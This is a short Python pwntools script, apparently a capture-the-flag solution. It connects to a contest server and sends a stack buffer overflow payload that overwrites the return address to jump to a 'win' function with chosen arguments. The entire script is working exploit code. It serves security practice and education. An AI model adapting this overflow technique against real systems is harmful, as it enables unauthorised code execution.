from pwn import *
r = remote("ctf.umbccd.io", 4000)
print(r.recvline())
print(r.recvline())

print(r.recvline())
print(r.recvline())
r.sendline('Ydna')
print(r.recvline());


payload = b'a' * 0x6c #this is the offset that the second input is asking us for
payload += b'aaaa' #4 extra a's to get us through the base pointer
payload += p32(0x08049182) #address of win function
payload += b'a' * 4 #move the stack over 4 so we get to our local varibles
payload += p32(0x4b0) #first local variable
payload += p32(0x16e) #second local variable
print(payload) #send tweet
r.sendline(payload)
print(r.recvline())
